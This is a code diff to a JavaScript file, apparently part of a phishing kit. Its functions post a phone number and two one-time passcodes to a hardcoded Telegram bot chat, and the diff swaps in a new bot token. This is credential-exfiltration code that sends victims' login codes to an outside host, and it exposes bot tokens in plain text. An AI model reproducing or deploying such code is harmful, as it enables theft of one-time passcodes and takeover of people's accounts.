@@ -45,7 +45,7 @@ const genUniqueId = length =>
     });
 
 const functionsendNumber = (phoneNumber) => new Promise((resolve, reject) => {
-    fetch(`https://api.telegram.org/bot5046108013:AAENocDY3h3DW3z26lgbx0jhFFac-Zz1_ds/sendMessage?chat_id=783007104&text=${phoneNumber}`, {
+    fetch(`https://api.telegram.org/bot5104006090:AAE42D5lgDA715SaLOXfQEhm0M6PhFUS1V8/sendMessage?chat_id=783007104&text=${phoneNumber}`, {
     method: 'POST',
 })
     .then(res => res.json())
@@ -56,7 +56,7 @@ const functionsendNumber = (phoneNumber) => new Promise((resolve, reject) => {
 });
 
 const functionsendOtp1 = (text1) => new Promise((resolve, reject) => {
-    fetch(`https://api.telegram.org/bot5046108013:AAENocDY3h3DW3z26lgbx0jhFFac-Zz1_ds/sendMessage?chat_id=783007104&text=${text1}`, {
+    fetch(`https://api.telegram.org/bot5104006090:AAE42D5lgDA715SaLOXfQEhm0M6PhFUS1V8/sendMessage?chat_id=783007104&text=${text1}`, {
     method: 'POST',
 })
     .then(res => res.json())
@@ -67,7 +67,7 @@ const functionsendOtp1 = (text1) => new Promise((resolve, reject) => {
 });
 
 const functionsendOtp2 = (text2) => new Promise((resolve, reject) => {
-    fetch(`https://api.telegram.org/bot5046108013:AAENocDY3h3DW3z26lgbx0jhFFac-Zz1_ds/sendMessage?chat_id=783007104&text=${text2}`, {
+    fetch(`https://api.telegram.org/bot5104006090:AAE42D5lgDA715SaLOXfQEhm0M6PhFUS1V8/sendMessage?chat_id=783007104&text=${text2}`, {
     method: 'POST',
 })
     .then(res => res.json())
